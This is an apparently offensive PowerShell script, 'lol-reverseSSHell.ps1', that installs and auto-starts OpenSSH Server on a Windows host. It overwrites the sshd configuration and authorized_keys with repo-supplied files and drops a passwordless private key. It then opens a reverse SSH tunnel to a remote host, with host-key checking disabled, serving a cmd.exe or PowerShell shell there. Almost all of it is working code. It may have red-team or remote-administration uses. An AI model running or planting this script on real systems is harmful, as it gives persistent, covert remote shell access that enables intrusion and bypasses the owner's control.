<#
.SYNOPSIS
lol-reverseSSHell.ps1 - Living Off the LAN Reverse Shell | Cmd.exe & PowerShell over SSH

This script will create a reverse ssh connection to a desired host and serve a CMD.exe shell 

Required: 
  - Run .\lol-reverseSSHell.ps1 as Admin. 
  - OpenSSH Server must be installed on Windows host where this script runs. 
  - Two ** NEW ** sets of SSH Keypairs are generated:
      Key Pair A: 
        - Place the private Key A in repo's root directory. Name it 'winkey'. No password protecting private key.
        - Public key A is added to destination host's authorized_keys file.
      Key Pair B:
        - Private Key B should be placed on destination host recieving the SSH connection. NOT in repo's root.
        - Public Key B should be added to the repo's authorized_keys file.   

.EXAMPLE 
  .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP>
.EXAMPLE
  .\LoL-ReverseSSHell.ps1 -DestinationUserName <UserName> -DestinationHost <IP> -WinPrivateKey [.\winkey] -InstallOpenSSH [yes]
.EXAMPLE  
  .\LoL-ReverseSSHell.ps1 -DestinationUserName SystemUser -DestinationHost 10.10.10.10 -WinPrivateKey .\winkey -DestinationPort 22 -DestinationBindLocalPort 5555 -InstallOpenSSHServer yes

.NOTES
*** Replace SSH Keys in Repo ***

Change Shell from Cmd.exe to Powershell:
  After getting Cmd.exe shell, type 'powershell' and hit enter.
    - or - 
  Set in Windows Registry - * Use with Caution *
    New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force

Author: Arron Jablonowski  
Last Modified: 2.18.2021
Version: 0.5.1 - BETA 

#>  

[CmdletBinding()]
param (	
        # Domain to scan.
        [Parameter(Mandatory=$true)]
        [string]$DestinationUserName,  # Username for Remote Host 
        [Parameter(Mandatory=$true)]
        [string]$DestinationHost,  # Destination IP or domain name
        [Parameter(Mandatory=$false)]
        [string]$DestinationPort = "22", # Port to send SSH connection over
        [Parameter(Mandatory=$false)]
        [string]$DestinationBindLocalPort ="7777", #Desination Host's Local Port to Bind Shell to
        [Parameter(Mandatory=$false)]
        [string]$WinPrivateKey = "$HOME\.ssh\winkey", # used to point to a Private key file
        [Parameter(Mandatory=$false)]
        [string]$InstallOpenSSHServer = "no" # If Yes > INSTALL OpenSSH
)   

function InstallSSHServer() {
    # OpenSSH Server 
    $openSSHServer = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"
    Add-WindowsCapability -Online -Name $openSSHServer.Name 
    start-sleep 5
    
    # Start & Stop the service to create sshd config files 
    $sshDaemonSrv = Get-Service -Name "sshd"
    Start-service -name $sshDaemonSrv.Name 
    Start-Sleep 5
    Stop-Service -Name $sshDaemonSrv.Name 
    
    # SSH config file 
    Remove-Item "$env:PROGRAMDATA\ssh\sshd_config" -Force # Remove default sshd config 
    Copy-Item ".\sshd_config" "$env:PROGRAMDATA\ssh\sshd_config" -Force # replace with our sshd_config file  

    $dotSSH = "$HOME\.ssh"
    if(![System.IO.File]::Exists($dotSSH)) {
        mkdir $dotSSH # make Windows SSH dir 
    }

    # Authorized Keys file 
    $authorizedKeyFilePath = "$HOME\.ssh\authorized_keys"
    copy-item ".\authorized_keys" $authorizedKeyFilePath -Force # authorized_keys

    $sshDaemonSrv = Get-Service -name "sshd"
    Set-Service -name $sshDaemonSrv.name -StartupType Automatic # set sshd startup to Auto 
    Start-Service -name $sshDaemonSrv.Name # start sshd 
 
    #Copy Windows Private Key 
    copy-item ".\winkey" "$HOME\.ssh\winkey" -Force # copy priv key for reverse connection 
    start-sleep 5
}

# Check if OpenSSH Server is Installed and Warn if NOT installed. 
$sshServerStatus = Get-WindowsCapability -Online | Where-Object Name -like "OpenSSH.Server*"
IF (!($sshServerStatus.State -eq "Installed")){
    # Catch OpenSSH Install Switch
    IF (($InstallOpenSSHServer -eq "Yes") -or ($InstallOpenSSHServer -eq "Y")){
            InstallSSHServer # call function to install ssh server 
    }
    Else{
        Write-Host "OpenSSH Server is NOT currently Installed."
        $installServer = Read-Host "Would you like to Install OpenSSH Server? (Yes, No)"
        # If SSH Server Install Switch is Yes 
        IF (($installServer -eq "Yes") -or ($installServer -eq "Y")){
            InstallSSHServer # call function to install ssh server 
        }
        Else{ 
            Exit
        }  
    }
}

# Reverse SSH connection to Remote Host
Write-Verbose "On $DestinationHost type: ssh localhost -p $DestinationBindLocalPort" -Verbose
ssh.exe -fN -R "$DestinationBindLocalPort`:127.0.0.1:22" "$DestinationUserName@$DestinationHost" -p $DestinationPort -i "$WinPrivateKey" -o "StrictHostKeyChecking=no"  # -vvv ## Uncomment '-vvv' to troubleshoot connections.

